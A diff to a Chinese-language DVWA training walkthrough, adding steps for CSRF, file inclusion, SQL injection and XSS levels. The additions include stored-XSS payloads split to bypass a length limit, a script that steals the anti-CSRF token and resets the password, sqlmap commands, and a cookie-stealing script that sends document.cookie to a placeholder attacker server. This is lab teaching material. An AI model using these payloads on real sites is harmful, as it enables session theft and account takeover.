@@ -26,7 +26,7 @@
 - [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](https://www.freebuf.com/articles/web/120985.html)
 - [新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS](https://www.freebuf.com/articles/web/123779.html)
 - [DVWA 黑客攻防演练（十三）JS 攻击 JavaScript Attacks](https://www.cnblogs.com/jojo-feed/p/10206443.html)
-- [DVWA 黑客攻防实战（十五） 绕过内容安全策略 Content Security Policy (CSP) Bypass](ttps://www.cnblogs.com/jojo-feed/p/10204588.html)
+- [DVWA 黑客攻防实战（十五） 绕过内容安全策略 Content Security Policy (CSP) Bypass](https://www.cnblogs.com/jojo-feed/p/10204588.html)
 - [2019-3-16 dvwa学习(16)--JavaScript Attacks JS攻击](https://blog.csdn.net/weixin_42555985/article/details/88641118)
 - [DVWA Weak Session IDs 通关教程](http://www.storysec.com/dvwa-weak-session-ids.html)
 - [DVWA XSS (DOM) 通关教程](http://www.storysec.com/dvwa-xss-dom.html)
@@ -34,6 +34,9 @@
 - [DVWA File Inclusion 通关教程](http://www.storysec.com/dvwa-file-inclusion.html)
 - [DVWA Command Injection 通关教程](http://www.storysec.com/dvwa-command-injection.html)
 - [DVWA File Upload 通关教程](http://www.storysec.com/dvwa-file-upload.html)
+- [DVWA XSS (Reflected) 通关教程](http://www.storysec.com/dvwa-xss-reflected.html)
+- [DVWA CSRF 通关教程](http://www.storysec.com/dvwa-csrf.html)
+- [DVWA 1.10 High等级的CSRF另类通关法](https://www.freebuf.com/articles/web/203301.html)
 
 ---
 
@@ -776,7 +779,17 @@ if( isset( $_GET[ 'Change' ] ) ) {
 
 	检查 string 中是否含有 pattern（不区分大小写），如果有返回 True，反之 False。
 
+- **stripos(string,find,start)**
+
+	stripos() 函数查找字符串在另一字符串中第一次出现的位置,不区分大小写。
+
 可以看到，Medium 级别的代码检查了保留变量 HTTP_REFERER（http 包头的 Referer 参数的值，表示来源地址）中是否包含 SERVER_NAME（http 包头的 Host 参数，及要访问的主机名，这里是 dvwa靶机的IP地址），希望通过这种机制抵御 CSRF 攻击。
+
+PHP 超全局变量 `$_SERVER` 中的两个值：
+
+$_SERVER['HTTP_REFERER']：PHP 中获取链接到当前页面的前一页面的 url 链接地址，即 HTTP 数据包中的 Referer 参数的值。
+
+$_SERVER['SERVER_NAME']：PHP 中获取服务器主机的名称，即 HTTP 数据包中的 Host 参数的值。
 
 **漏洞利用**
 
@@ -861,17 +874,54 @@ generateSessionToken();
 
 然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架 iframe 访问的地址是 http://<dvwa靶机IP>/dvwa/vulnerabilities/csrf ，位于服务器 A 上，而我们的攻击页面位于黑客服务器 B 上，两者的域名不同，域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容，除非域名 A 下的页面主动发送信息给域名 B 的页面，所以我们的攻击脚本是不可能取到改密界面中的 user_token。
 
-由于跨域是不能实现的，所以我们要将攻击代码注入到 dvwa 靶机中，才有可能完成攻击。下面利用 High 级别的 XSS 漏洞协助获取 Anti-CSRF token（因为这里的 XSS 注入有长度限制，不能够注入完整的攻击脚本，所以只获取 Anti-CSRF token）。
+由于跨域是不能实现的，所以我们要将攻击代码注入到 dvwa 靶机中，才有可能完成攻击。下面利用 High 级别的存储型 XSS 漏洞协助获取 Anti-CSRF token（因为这里的 XSS 注入有长度限制，不能够注入完整的攻击脚本，所以只获取 Anti-CSRF token）。
 
+注入代码如下
+`<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`
 
-略
+**另类通关**
 
+通过 XSS 获得 token 之后修改密码
+同等级的 XSS-Stored $name 可被我们利用做 XSS，这样就可以配合 CSRF 来重置用户密码了。
+需要先说明一下 DVWA 的数据库设计，guestbook 表的 name 字段类型为 varchar(100)，也就是说最多 name 只能写入 100 个字符，超过的字符会被数据库抛弃不存储。
 
+由于100个字符的限制，将payload分成多份提交
+```js
+<svg/onload="s='&#115;&#99;&#114;&#105;&#112;&#116;'">  # 事件内可以解析ASCII编码后的字符串
+<svg/onload="j=document.createElement(s)">  # 拼接出一个script来引入外部js
+<svg/onload="j.src='http://<服务器B>/x.js'">
+<svg/onload="document.body.appendChild(j)">
+```
+这样就可以绕过后端的正则过滤
 
+为了方便测试，在 x.js 里只写了 `alert('HelloDVWA')`
 
+![image](../../../img/渗透/实验/dvwa82.png)
 
+发现成功了！！！x.js 被成功加载了。但多次加载还是有问题
 
+使用延时，人工干预执行时序
+```js
+<svg/onload="setTimeout(function(){s='&#115;&#99;&#114;&#105;&#112;&#116;'},3000)">
+<svg/onload="setTimeout(function(){j=document.createElement(s)},4000)">
+<svg/onload="setTimeout(function(){j.src='http://<服务器B>/x.js'},5000)">
+<svg/onload="setTimeout(function(){document.body.appendChild(j)},6000)">
+```
+稳定触发
 
+下面修改 x.js
+```js
+ifr = document.createElement('iframe');
+ifr.src="../csrf";
+ifr.hidden=1;
+document.body.appendChild(ifr);
+setTimeout(function(){f=frames[0];t=f.document.getElementsByName('user_token')[0].value;i=document.createElement('img');i.src='../csrf/?password_new=admin&password_conf=admin&Change=Change&user_token='+t;},3000)
+```
+
+当管理员访问留言板 XSS-Stored 时候：
+1. 会先加载 `x.js`
+2. `x.js` 内的脚本内容，会创建一个隐藏的 `iframe` 标签到 `DOM`
+3. 等待 `iframe` 创建完成之后，便通过创建一个 `img` 标签，自动触发修改密码的请求
 
 ### Impossible
 **服务器端核心代码**
@@ -1035,6 +1085,16 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 可以看到，Medium 级别的代码增加了 str_replace 函数，对 page 参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。
 
+**相关函数**
+- **str_replace()**
+	str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。
+
+	该函数必须遵循下列规则：
+	- 如果搜索的字符串是数组，那么它将返回数组。
+	- 如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。
+	- 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换
+	- 如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。
+
 **漏洞利用**
 
 使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。
@@ -1076,9 +1136,17 @@ if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
 ```
 可以看到，High 级别的代码使用了 fnmatch 函数检查 page 参数，要求 page 参数的开头必须是 file，服务器才会去包含相应的文件。
 
+**相关函数**
+- **fnmatch(pattern,string,flags)**
+
+	函数根据指定的模式来匹配文件名或字符串。
+
+	此函数对于文件名尤其有用，但也可以用于普通的字符串。普通用户可能习惯于 shell 模式或者至少其中最简单的形式 '?' 和 '*' 通配符，因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便。
+
 注：fnmatch 函数适用于 PHP >= 4.3.0，因此 php 版本高于这个才能利用，否则会出现打不开 high 等级页面。
 
 **漏洞利用**
+
 High 级别的代码规定只能包含 file 开头的文件，看似安全，不幸的是我们依然可以利用 file 协议绕过防护策略。file 协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是 file 协议。
 
 构造 url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file://C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
@@ -2088,6 +2156,15 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 		![image](../../../img/渗透/实验/dvwa80.png)
 
+**sqlmap**
+
+`sqlmap -u "http://<IP地址!!!>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<自己的sessionID!!!>" --batch`
+
+```
+--cookie : 带 cookie 注入
+--batch : 不要请求用户输入，使用默认行为
+```
+
 ### Medium
 **服务器端核心代码**
 ```php
@@ -2180,6 +2257,16 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 7. 获取数据
 
     抓包修改参数 id 为 `1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`
+
+**sqlmap**
+
+抓包，把数据存到 1.txt
+
+`sqlmap -r 1.txt`
+
+```
+-r 请求文件 从 HTTP 请求文件中加载
+```
 
 ### High
 **服务器端核心代码**
@@ -2490,6 +2577,10 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 
 			同样采用二分法。
 
+**sqlmap**
+
+`sqlmap -u "http://<IP地址!!!>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<自己的sessionID!!!>"`
+
 ### Medium
 **服务器端核心代码**
 ```php
@@ -2544,6 +2635,16 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 	抓包改参数 id 为 `1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #` ，明显延迟，说明数据中的第一个表名长度为9个字符；
 
 	抓包改参数 id 为 `1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #` ，明显延迟，说明uers表有8个字段。
+
+**sqlmap**
+
+抓包，把数据存到 1.txt
+
+`sqlmap -r 1.txt`
+
+```
+-r 请求文件 从 HTTP 请求文件中加载
+```
 
 ### High
 **服务器端核心代码**
@@ -2923,6 +3024,8 @@ if (array_key_exists("default", $_GET) && !is_null($_GET['default'])) {
 ---
 
 ### XSS (Reflected)
+反射型 XSS，非持久化，需要欺骗用户自己去点击带有特定参数的 XSS 代码链接才能触发引起（服务器中没有这样的页面和内容），一般容易出现在搜索页面。
+
 #### Low
 **服务器端核心代码**
 ```php
@@ -2935,7 +3038,7 @@ if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
 }
 ```
 
-可以看到，代码直接引用了 name 参数，并没有任何的过滤与检查，存在明显的 XSS 漏洞。
+可以看到，代码直接采用 get 方式传入了 name 参数，并没有任何的过滤与检查，存在明显的 XSS 漏洞。
 
 **漏洞利用**
 
@@ -2944,6 +3047,31 @@ if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
 相应的XSS链接
 
 `http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
+
+**实战利用盗取用户 cookies 进入后台**
+
+攻击者自己网站 http://<服务器B>/xss/ 里构造
+
+hacker.js
+```js
+var img = new Image();
+img.src="http://<服务器B>/xss/hacker.php?x=" + document.cookie;
+document.body.append(img);
+```
+
+hacker.php
+```php
+<?php
+$cookie = $_GET['x'];
+file_put_contents('cookie.txt', $cookie);
+?>
+```
+
+于是插入 dvwa 的 xss payload 为 `<script src="http://<服务器B>/xss/hacker.js" /></script>`
+
+XSS 利用，得到 cookies
+
+![image](../../../img/渗透/实验/dvwa81.png)
 
 #### Medium
 **服务器端核心代码**
@@ -3047,11 +3175,17 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 **相关函数介绍**
 
-trim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括 `、\t、\n、\x0B、\r` 以及空格，可选参数 charlist 支持添加额外需要删除的字符。
+- **trim(string,charlist)**
 
-mysql_real_escape_string(string,connection) 函数会对字符串中的特殊符号 `\x00，\n，\r，\，‘，“，\x1a` 进行转义。
+	移除字符串两侧的空白字符或其他预定义字符，预定义字符包括 `、\t、\n、\x0B、\r` 以及空格，可选参数 charlist 支持添加额外需要删除的字符。
 
-stripslashes(string) 函数删除字符串中的反斜杠。
+- **mysql_real_escape_string(string,connection)**
+
+	函数会对字符串中的特殊符号 `\x00，\n，\r，\，‘，“，\x1a` 进行转义。
+
+- **stripslashes(string)**
+
+	函数删除字符串中的反斜杠。
 
 **漏洞利用**
 
